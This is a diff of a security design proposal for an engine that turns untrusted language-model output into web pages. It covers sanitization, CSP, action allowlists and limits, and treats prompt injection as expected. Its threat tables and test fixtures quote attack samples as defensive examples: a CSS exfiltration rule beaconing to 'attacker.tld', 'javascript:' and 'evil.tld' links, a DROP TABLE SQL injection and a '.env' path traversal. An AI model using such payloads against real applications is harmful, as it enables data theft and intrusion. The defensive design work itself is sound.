@@ -1,122 +1,296 @@
-# Security Model & Boundary Controls: Láadan Engine
+# Security Model
 
-**Status:** Design Proposal (Phase 0 Blueprint)  
-**Focus:** Untrusted Model Output, Zero-Eval SDUI, Sanitization Pipeline, and Safe Visual Capabilities  
+**Status:** Design proposal. This document describes required behavior. Nothing is implemented yet.
 
 ---
 
-## 1. Security Approach: Capability Without `eval`
+## 1. Scope
 
-Prompt injection in generative web applications cannot be eliminated at the prompt layer alone. If a user visits a synthetic route or views data that contains an indirect prompt injection, a language model may be tricked into emitting malicious markup, phishing overlays, or unauthorized state changes.
+The central question: **can model output make the server or the browser execute something, read something, or contact something it should not?** The design answers this with structural controls that do not depend on the model behaving well. Prompt injection is expected, not prevented (section 8).
 
-Instead of relying on prompt-level instructions ("please do not output `<script>` tags"), `laadan-engine` treats every model response as untrusted input (`@we`) and enforces hard technical boundaries in Python, Rust (`nh3`), and browser CSP headers:
+### 1.1 Actors
+
+| Actor | Trust in v1 | Notes |
+| :--- | :--- | :--- |
+| Local user | Trusted | Single user on loopback. Input is validated for shape and size, not for intent. See section 9. |
+| Model | Untrusted, assumed adversarial | May hallucinate or follow instructions injected through user input or stored data. |
+| Other websites in the same browser | Untrusted | May try to send requests to `127.0.0.1` (CSRF, DNS rebinding, cost abuse). |
+| Model provider | Receives prompts | Sees everything in a prompt. Never receives secrets. |
+| Repository files | Trusted | Templates, client script, stylesheet, assets, fixtures. Reviewed like code. |
+
+### 1.2 Goals
+
+* **G1.** No model output is executed as code: not on the server (Python, SQL, shell, templates, file paths) and not in the browser (JavaScript, event handlers, URL schemes, CSS).
+* **G2.** Model output cannot make the browser contact any origin other than the engine's own.
+* **G3.** Model output cannot read or change files, configuration, or secrets, and cannot make the server send requests anywhere except the configured model endpoint.
+* **G4.** Resource use caused by model output or by requests is bounded (size, depth, count, time, rate).
+* **G5.** Other websites cannot make the engine generate pages, run actions, or read responses.
+
+### 1.3 Non-goals in v1
+
+* Protecting the local user from their own input.
+* Truthfulness of generated content.
+* Isolation between multiple users.
+* Preventing prompt injection.
+* Preventing misleading generated content (section 9).
+
+---
+
+## 2. Where Model Output Could Do Harm
+
+### 2.1 In the browser
+
+| Sink | Example | Control |
+| :--- | :--- | :--- |
+| Script elements, event handlers | `<script>`, `<img onerror=...>` | Templates never insert model strings as markup. `RichText` passes through nh3, which removes scripts and all `on*` attributes. Output check. CSP. |
+| URL attributes | `javascript:alert(1)`, `//evil.tld` | `Link` targets and `RichText` `href` values must match the internal route pattern. Images come only from the asset catalog. No external links in v1. |
+| CSS | `<style>`, `style="..."`, `url()` beacons, full-screen overlays | No style elements or attributes from the model. Themes are validated tokens compiled into a server-generated stylesheet. CSP `style-src 'self'`. |
+| Attribute breakout | Text value `" onmouseover="...` | Jinja2 autoescaping. All template attributes are quoted. Attribute names are fixed in templates. |
+| DOM clobbering | `id="ldn-app"`, `name="getElementById"` | Model IDs are rendered with the prefix `u-`; server IDs use `ldn-`. The client uses `getElementById` with the prefix and never reads named properties of `window`, `document`, or forms. |
+| Unintended actions | A button that triggers a server operation it should not | Buttons carry only a server-assigned ID. Action kinds come from a fixed enum. The model cannot reference engine-internal actions. |
+| Data exfiltration | Image beacons, `fetch`, form posts to other hosts | CSP limits `img-src`, `connect-src`, and `form-action` to `'self'`. No external URLs in generated markup. |
+| Misuse of the client script | Model data that the client interprets as code | The client never evaluates anything. It inserts HTML only from the engine's own JSON responses, through a Trusted Types policy where the browser supports it. |
+
+### 2.2 On the server
+
+| Sink | Example | Control |
+| :--- | :--- | :--- |
+| Code execution | `eval`, `exec`, `pickle`, `yaml.load`, subprocess | Model output is parsed only as JSON into Pydantic models. None of these functions are used anywhere in the codebase. |
+| Template injection | Model text containing `{{ ... }}` | Templates are loaded only from the package directory. Model strings are passed as variables, never as template source. |
+| SQL injection | Entity type `contact'; DROP TABLE ...` | Parameterized queries on a fixed schema. Entity types and attribute names are values, never identifiers. |
+| Path traversal | Asset ID `../../.env` | Asset IDs are looked up in the catalog dictionary. Route paths and model strings are never used to build file paths. |
+| SSRF | Model asks the server to fetch a URL | The server never fetches URLs from model output or requests. The only outbound connection is the configured model endpoint. |
+| Resource exhaustion | 10,000 nested nodes, 50 MB response | Limits in section 7, checked before and during parsing. |
+| Secret leakage | Model asks for the API key | Secrets are never placed in prompts, rendered pages, or logs. Error responses are generic. |
+| Memory poisoning | Model deletes or rewrites all contacts | Entity operations are typed and capped per response. Entities written by the model are marked `we`. The worst case is wrong data, not code execution. |
+
+---
+
+## 3. The Compiler Pipeline
+
+Every response that contains model-derived content passes these stages in order. A failure at any stage produces the fallback (section 3.7).
 
 ```text
-[ Browser / API Input (@wahel) ]
-               │
-               ▼
-     [ Ingress Validator ]    ── Pydantic schema check, size cap (64 KB), CSRF check (@wa)
-               │
-               ▼
-     [ Model Gateway ]        ── Generates untrusted PageDocument AST proposal (@we)
-               │
-               ▼
-     [ AST & Theme Compiler ] ── Pydantic discriminated union + bounded theme tokens
-               │
-               ▼
-     [ RichText Sanitizer ]   ── nh3 (Rust ammonia) + selectolax tree verification
-               │
-               ▼
-     [ Delivery Gateway ]     ── Strict CSP Level 3 (script-src 'self', connect-src 'self')
-               │
-               ▼
-     [ Client Runtime ]       ── laadan-client.js (~4 KB), event delegation, zero eval (@wi)
+raw model text (we)
+   │
+   ▼
+1. Parse      JSON only, size checked before parsing
+   │
+   ▼
+2. Validate   Pydantic v2, strict mode, extra fields forbidden, limits from section 7
+   │
+   ▼
+3. Resolve    asset IDs exist in the catalog, targets exist in the stored page, IDs unique
+   │
+   ▼
+4. Render     application-owned Jinja2 templates, autoescaping on
+   │
+   ▼
+5. Sanitize   RichText only, through nh3 with the allowlist in 3.2
+   │
+   ▼
+6. Verify     final HTML parsed with selectolax and checked against 3.3
+   │
+   ▼
+7. Deliver    security headers from 3.5
 ```
 
----
+### 3.1 Rendering
 
-## 2. Threat Matrix & Architectural Mitigations
+* Each component type has exactly one template. Templates are part of the repository.
+* Model strings appear in templates in only three ways:
+  * as **text content**, escaped by Jinja2;
+  * as **attribute values** that have already passed an enum or regex check (IDs, input names, variants, theme tokens);
+  * as **sanitized `RichText`** inside a type called `SafeHtml`.
+* `SafeHtml` can only be constructed by the sanitizer. It is the only type the templates output without escaping. Code review and a test assert that no other code marks strings as safe (`Markup(...)`, the `|safe` filter).
+* Model strings have control characters and bidirectional override characters removed before rendering.
 
-| Threat Category | Attack Vector in Generative Web Apps | Mitigation in `laadan-engine` |
-| :--- | :--- | :--- |
-| **Spoofing** | Model hallucinates authenticated status or tries to self-certify its output as verified (`@wi`). | Session cookies are HTTP-only and signed server-side. Model proposals are forced to `Evidence.CONJECTURAL` (`@we`) by the `ModelGateway` regardless of raw token output. |
-| **Tampering (XSS)** | Prompt injection causes the model to emit `<script>`, inline `onerror=...`, or `javascript:` links. | Structural UI is compiled from a typed Pydantic AST via Jinja2 autoescaping. Free-form rich text is stripped down to safe formatting tags by `nh3` (Rust `ammonia`). |
-| **Traceability** | Ambiguity over whether a state change came from user input, a fast-path toggle, or a model hallucination. | Structured provenance logging (`LAADAN_LOG_PROVENANCE`) records the route, action envelope, and evidential marker (`@wa`, `@we`, `@wi`) for every state transition. |
-| **Information Disclosure** | **CSS Data Exfiltration** (e.g., `input[value^="a"] { background: url(https://attacker.tld/a) }`) or external tracking beacons. | Raw `<style>` blocks, arbitrary inline `style` strings, and external `url(...)` references are banned. Egress is locked down via `connect-src 'self'` and `img-src 'self' data:`. |
-| **Denial of Service** | Unbounded token output, deep AST nesting, or rapid click-spamming exhausting LLM rate limits. | Payload size limits (`LAADAN_MAX_PAYLOAD_BYTES=65536`), AST recursion depth limits, action coalescing (`ActionCoalescer`), and the Zero-LLM Fast-Path for UI toggles. |
-| **Elevation of Privilege** | **Excessive Agency**: Model attempts to run shell commands, arbitrary Python functions, or database queries. | The model has zero access to shell tools, `eval`, or raw SQL. It can only propose UI component trees and bounded `CarrierBag` entity updates. |
+### 3.2 `RichText` sanitizer configuration (nh3)
 
----
+nh3 is a Python binding for the Rust library ammonia. It parses HTML with html5ever, an HTML5-compliant parser, keeps only allowlisted tags and attributes, and serializes a new, well-formed fragment.
 
-## 3. Defense-in-Depth Pipeline: High Capability + High Safety
+| Setting | Value |
+| :--- | :--- |
+| Tags | `p`, `br`, `strong`, `em`, `code`, `pre`, `blockquote`, `ul`, `ol`, `li`, `a`, `details`, `summary`, `del`, `sub`, `sup`, `hr` |
+| Attributes | `href` on `a`. No other attributes on any tag (no `id`, `class`, `style`, `name`). |
+| `href` filter | Kept only if the value matches the internal route pattern (starts with a single `/`, no scheme, no `//`). Otherwise removed. |
+| Removed with content | `script`, `style` |
+| Comments | Removed |
 
-A naive security policy locks down a UI so tightly that every generated page looks identical and static. `laadan-engine` separates **dangerous capabilities** (arbitrary code, arbitrary selectors, external URLs) from **expressive capabilities** (rich components, custom color themes, native HTML disclosure widgets, and form controls).
+The tag list contains no elements that switch the parser into a different mode (`svg`, `math`, `template`, `textarea`, `title`, `noscript`, `style`, `xmp`). Such elements are a common source of mutation XSS, where markup changes meaning when it is parsed a second time.
 
-### 3.1 Two-Stage Rendering: Pydantic AST Compiler + `nh3` Sanitizer
-Rather than running a single regex or sanitizer over raw LLM HTML, rendering is split into two distinct mechanisms:
+`<details>` and `<summary>` give the model expandable sections that work in the browser without any script.
 
-1. **Structural Components & Form Controls (Compiled via Jinja2):**
-   * Layout containers, cards, tables, buttons (`ActionTrigger`), and form inputs (`TextInput`, `SelectField`, `Checkbox`) are never parsed from raw model HTML.
-   * Instead, the model emits typed JSON nodes validated by Pydantic v2 discriminated unions. The server's `PageCompiler` renders these nodes through application-owned Jinja2 templates with strict attribute escaping.
-   * Because the server templates emit the `<input>`, `<select>`, and `<button data-laadan-*>` elements directly, form controls remain 100% functional without opening an HTML injection vector.
+### 3.3 Output check (selectolax)
 
-2. **RichText & Native Interactive Formatting (Sanitized via `nh3` + `selectolax`):**
-   * Inside `RichText` components, the model can write expressive HTML formatting without escaping headaches.
-   * **`nh3` (Rust `ammonia` / `html5ever`)** parses and sanitizes `RichText` content in sub-millisecond time using a strict allowlist:
-     * **Allowed Tags:** `p`, `span`, `strong`, `em`, `code`, `pre`, `blockquote`, `ul`, `ol`, `li`, `br`, `hr`, `sub`, `sup`, `del`, `a`, `details`, `summary`.
-     * **Bonus Capability (`<details>` / `<summary>`):** Allowing native HTML `<details>` and `<summary>` lets the model build expandable accordions and spoilers that work natively in the browser with zero JavaScript.
-     * **Stripped Everything Else:** `<script>`, `<style>`, `<iframe>`, `<object>`, `<embed>`, `<svg>`, `<math>`, `<form>`, and all `on*` event attributes are unconditionally removed.
-     * **Link Safety:** `href` on `<a>` tags is restricted to local relative paths (`/instagram`, `/whatsapp`) or explicitly allowed schemes (`https:`), with `rel="noopener noreferrer"` enforced automatically by `nh3`.
-   * **`selectolax` (C `lexbor` engine)** is used in the security adapter and test suite for fast server-side DOM tree inspection, verifying structural invariants (such as ID prefixing and absence of forbidden nodes) before fragments leave the server.
+selectolax is a Python binding for lexbor, a fast HTML5 parser. The rendered page or fragment is parsed again and checked:
 
-### 3.2 Safe Visual Theming vs. CSS Exfiltration
-CSS is a surprisingly powerful attack vector: if a model can emit raw `<style>` rules, it can read secret values out of `<input>` fields using attribute selectors or overlay a fake login screen using `position: fixed; z-index: 999999`.
+* `script` elements: only the shell's `<script src="/static/laadan-client.js">`.
+* No `style` elements and no `style` attributes.
+* No attributes whose name starts with `on`.
+* No `iframe`, `object`, `embed`, `form`, `base`, `meta`, or `link` inside the app root. The shell contains exactly the expected `meta` and `link` elements.
+* Every `href` inside the app root matches the internal route pattern. Every `src` starts with `/static/`.
+* Every `id` inside the app root starts with `u-`.
+* `data-laadan-*` attributes come only from the set in the protocol spec, and their values match its patterns.
 
-To give every generated vibe-app its own visual identity (e.g., dark emerald for `/whatsapp`, warm gradient cards for `/instagram`, brutalist monospace for `/terminal`) **without** allowing raw CSS injection:
+This is a second, independent check. It cannot prove that every browser parses the HTML the same way, which is why the CSP exists as a third layer.
 
-1. **Bounded Theme Tokens (`PageDocument.theme`):**
-   * The model can specify a `theme` object on any `PageDocument` with validated properties:
-     * Color tokens (`primary`, `surface`, `background`, `text`, `accent`) validated against strict hex syntax (`^#[0-9a-fA-F]{6}$`) or named palette presets.
-     * Layout and shape tokens (`radius`: `"none" | "sm" | "md" | "lg" | "full"`, `font`: `"sans" | "mono" | "serif"`, `density`: `"compact" | "comfortable"`).
-   * The server compiles these validated tokens into scoped CSS custom properties (`--ldn-primary: #10b981; --ldn-radius: 0.75rem;`) on the page root. Because values cannot contain `url(...)`, `;`, `{`, or selectors, CSS exfiltration is impossible.
-2. **Utility Class Allowlist (`DESIGN_TOKEN_ALLOWLIST`):**
-   * Component `class` strings are split on whitespace and filtered against an allowlist of layout, flex/grid, spacing, and typography classes.
-   * Classes allowing full-viewport `position: fixed` overlays outside the application shell are excluded to prevent UI redressing.
+### 3.4 Themes
 
-### 3.3 Content Security Policy (CSP Level 3)
-Every HTML response includes a strict Content Security Policy header as a browser-enforced backstop:
+* The model may set theme tokens for an app: colors as `#rrggbb`, and enums for radius, font, and density.
+* The server writes them into `/_laadan/theme/{app}.css` as CSS custom properties (`--ldn-primary: #10b981;`).
+* Values cannot contain `;`, `{`, `}`, `(`, quotes, or `url`, because they must match the regex or enum exactly.
+* The stylesheet is generated only from stored, validated tokens. The model never supplies CSS text, selectors, or class names.
+
+### 3.5 Response headers
+
+Every HTML response carries:
 
 ```http
-Content-Security-Policy:
-    default-src 'none';
-    script-src 'self';
-    style-src 'self';
-    img-src 'self' data:;
-    font-src 'self';
-    connect-src 'self';
-    frame-src 'none';
-    object-src 'none';
-    base-uri 'none';
-    form-action 'self';
-    frame-ancestors 'none';
+Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'; require-trusted-types-for 'script'; trusted-types laadan
+X-Content-Type-Options: nosniff
+Referrer-Policy: no-referrer
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
 ```
 
-* **Zero Inline Scripts:** Because `laadan-client.js` is loaded from `/static/laadan-client.js` and uses event delegation (`data-laadan-*`), `script-src 'self'` requires no nonces or `'unsafe-inline'`. Even if a sanitizer bug ever let an inline `<script>` or `onclick` slip through, the browser refuses to execute it.
-* **No Unauthorized Egress:** `connect-src 'self'` and `img-src 'self' data:` prevent the browser from leaking data to external servers via `fetch()`, `XMLHttpRequest`, WebSockets, or remote image requests.
+* No inline scripts or inline styles are needed, so neither `'unsafe-inline'` nor nonces are required. Even if markup slipped through every earlier stage, the browser would not run an inline script or apply an inline style.
+* `require-trusted-types-for 'script'` makes the browser reject HTML insertion through `innerHTML` and similar APIs unless the value comes from the client's named policy `laadan`. Browsers without Trusted Types support ignore this directive; the other controls still apply.
+* The CSP is always sent. It is not configurable.
+* JSON responses carry `Content-Type: application/json` and `X-Content-Type-Options: nosniff`.
 
-### 3.4 DOM Clobbering & ID Isolation
-DOM Clobbering happens when HTML elements with `id` or `name` attributes shadow global properties on `window` or `document`:
-1. **Automatic ID Prefixing:** Every component `id` supplied by the model (e.g., `target="chat-thread"`) is rendered into HTML with the prefix `ldn-user-` (`id="ldn-user-chat-thread"`).
-2. **Transparent Client Lookup:** `laadan-client.js` resolves target IDs via `document.getElementById("ldn-user-" + target)` and never reads named properties off `window` or `document`.
-3. **CSRF Isolation:** The anti-CSRF token is stored in the outer server-owned page shell (`<body data-ldn-csrf="...">`) and validated against a `SameSite=Strict` HTTP-only cookie, keeping session auth out of the model-generated fragment tree.
+### 3.6 Client script rules
 
-### 3.5 Symbolic Assets & Anti-SSRF
-To prevent Server-Side Request Forgery (SSRF) and external tracking beacons:
-* Models cannot supply raw image URLs.
-* Visual assets use the `Asset` component with symbolic IDs (`{"type": "Asset", "props": {"id": "asset:icon-message"}}`) discovered through the local `AssetCatalog`.
-* The server maps valid IDs to `/static/assets/...` files and replaces unknown IDs with a local fallback placeholder SVG.
+The client script (`laadan-client.js`) is part of the security core and is reviewed by hand. It has no dependencies and no build step.
 
-### 3.6 GlitchBoundary (Graceful Degradation)
-Language models occasionally produce truncated JSON, violate a schema constraint, or reference an invalid component prop. When validation fails:
-* `GlitchBoundary` catches the Pydantic or compiler error before any 500 error reaches the client.
-* It logs the rejected `@we` proposal for debugging and returns a clean, styled fallback fragment inside the target DOM container so the rest of the page remains interactive.
+* No `eval`, `Function`, string arguments to `setTimeout` or `setInterval`, or dynamic `import`.
+* `fetch` only to `/_laadan/action` on the same origin, with a JSON body.
+* HTML is inserted only from responses of that endpoint, through the Trusted Types policy `laadan`.
+* Targets are resolved with `document.getElementById("u-" + target)` and must be inside the app root (`#ldn-app`). Anything else is ignored.
+* The only navigation it performs is `location.reload()` for the `reload` operation.
+* Payloads and action definitions are never read from the page. The page contains only action IDs.
+
+### 3.7 GlitchBoundary (fallback)
+
+When parsing, validation, resolution, rendering, sanitizing, or verification fails:
+
+* No part of the rejected output is sent to the browser.
+* Full pages are replaced by a static fallback page with a retry button. Action responses contain one `replace` operation with a static fallback fragment.
+* The rejected output and the error are written to the local log for debugging.
+* No stack traces or internal details are sent to the client.
+
+---
+
+## 4. Actions
+
+Actions follow an application-owned allowlist:
+
+* The model can create buttons with two kinds of action: `toggle` (UI-only) and `intent` (generative). Tab switching is generated by the server for `Tabs` components. Engine actions such as `shell.regenerate` exist only in server templates.
+* When a page is stored, the server assigns each button an action ID and stores its definition: kind, target, intent label, payload, and include list.
+* The rendered button carries only `data-laadan-action="a12"`. Model-supplied payloads stay on the server.
+* An action request is accepted only if the action ID exists on the stored page for that route, the submitted value names match the inputs in the button's scope, and the included element IDs match the stored include list.
+* An `intent` label is a short snake_case string that describes the action to the model. It grants no capability; the server does not map it to code.
+
+---
+
+## 5. Entity Store
+
+* One table of entities: server-assigned ID, type, attributes as JSON, source route, evidential, timestamps.
+* The model can propose `create`, `update`, and `delete` operations. At most 20 operations per response.
+* Entity types match `^[a-z][a-z0-9_]{0,31}$`. Attributes are a flat JSON object with at most 32 keys and 4 KB in total. Values are strings, numbers, booleans, null, or lists of these.
+* All queries are parameterized. Types and attribute names are stored as values.
+* Entities written by the model are marked `we`, even when the content came from user input. Per-field provenance is later work.
+
+---
+
+## 6. Requests From Other Websites
+
+Treating the local user as trusted does not make other websites trusted. A page open in another tab can send requests to `127.0.0.1`. These controls address that:
+
+| Control | Protects against |
+| :--- | :--- |
+| `Host` header must be in `LAADAN_ALLOWED_HOSTS` | DNS rebinding: a foreign domain that resolves to `127.0.0.1` would otherwise count as same-origin. |
+| `POST` requests and JSON-mode requests from browsers require `Origin` to match, or `Sec-Fetch-Site: same-origin` | Cross-site request forgery |
+| Request bodies must be `application/json` | Cross-site pages cannot send JSON without a CORS preflight, and the server allows no CORS. |
+| No CORS headers | Other origins cannot read responses. |
+| Cross-site navigations to ungenerated routes get a confirmation page | Cost abuse through links or redirects |
+| Cross-site subresource requests and prefetches never generate | Cost abuse through `<img src>`, `fetch`, or browser prefetching |
+| No cookies in v1 | There is no session that could be stolen or ridden. |
+
+Non-browser clients such as `curl` and Postman send no `Origin` or `Sec-Fetch-*` headers and are allowed. They are not a cross-site risk.
+
+---
+
+## 7. Limits
+
+Limits are constants in the `domain` package, not configuration.
+
+| Item | Limit |
+| :--- | :--- |
+| Request body | 64 KB |
+| Raw model response | 256 KB |
+| Nodes per page document | 500 |
+| Tree depth | 12 |
+| Plain text field | 2,000 characters |
+| `RichText` field | 8,000 characters |
+| Table | 50 rows × 10 columns |
+| Buttons per page | 100 |
+| Entity operations per response | 20 |
+| `need_assets` rounds per generation | 1 |
+| JSON-mode response body | 64 KB, depth 8 |
+| Stored pages | 500, least recently used evicted |
+
+Size limits are checked before parsing, so an oversized response is rejected without being parsed. Regular expressions run only on length-checked strings.
+
+---
+
+## 8. Prompt Injection
+
+Prompt injection cannot be prevented at the prompt level. User input, stored entities, and earlier model output all end up in prompts and can contain instructions.
+
+With the controls above, a successful injection can cause:
+
+* misleading or wrong content in generated pages,
+* wrong entity data, marked `we`,
+* wasted model calls, bounded by the rate limiter.
+
+It cannot cause code execution in the server or browser, requests to other origins, or access to files, configuration, or secrets, because none of these are reachable from validated model output.
+
+Data sections in prompts are JSON-encoded, delimited, and labeled with their evidential. This reduces confusion between instructions and data; it is not relied on for security.
+
+---
+
+## 9. Residual Risks and Later Work
+
+### 9.1 Residual risks in v1
+
+* **Misleading content.** The model can build a page that looks like a login form or asks for sensitive data. Values entered there go only to the engine and the model provider. The server-owned shell marks the generated area.
+* **The model provider sees all prompt content.** Anything typed into a generated page is sent to the provider in `direct` and `batched` mode.
+* **Local access.** Any process or user on the same machine can reach the loopback port.
+* **Browser differences.** Trusted Types is not supported in every browser. CSP and the output check still apply there.
+* **Dependency correctness.** The design relies on Jinja2, nh3 and ammonia, selectolax and lexbor, Pydantic, and the browser's CSP enforcement. A lock file will be added with the first runtime code.
+
+### 9.2 Later work for multi-user operation
+
+* Sessions with `HttpOnly`, `SameSite=Strict` cookies and authentication.
+* Per-user entity and page stores, per-user rate limits.
+* Content from other users treated as untrusted input. It is already escaped and sanitized like model output.
+* External links through a confirmation page with an allowlist.
+* Per-field provenance, so values copied from user input can stay `wa`.
+
+---
+
+## 10. Testing Strategy
+
+* **Hostile fixtures.** `MockModelGateway` ships fixtures that simulate malicious model output. Each must end in either safe HTML or the fallback:
+  * `<script>` in a `Text` field, an `onerror` attribute in `RichText`
+  * `javascript:`, `data:`, and `//evil.tld` links
+  * `style` attributes, `<svg>` and `<math>` content, nested `<template>`
+  * a 10,000-level tree, a 1 MB response, truncated JSON
+  * unknown component types, extra fields, a self-assigned evidential
+  * targets that point at shell IDs or nonexistent IDs
+  * oversized or malformed entity operations
+* **Output-check tests.** Rendered fixtures are checked with the rules from section 3.3.
+* **Header tests.** Every response type carries the headers from section 3.5.
+* **Origin tests.** Requests with foreign `Host`, cross-site `Origin`, `text/plain` bodies, and prefetch headers are rejected or answered without generation.
+* **Static checks.** Ruff with the bandit rules (`S`) flags `eval`, `exec`, `pickle`, `subprocess`, and similar calls in the codebase.
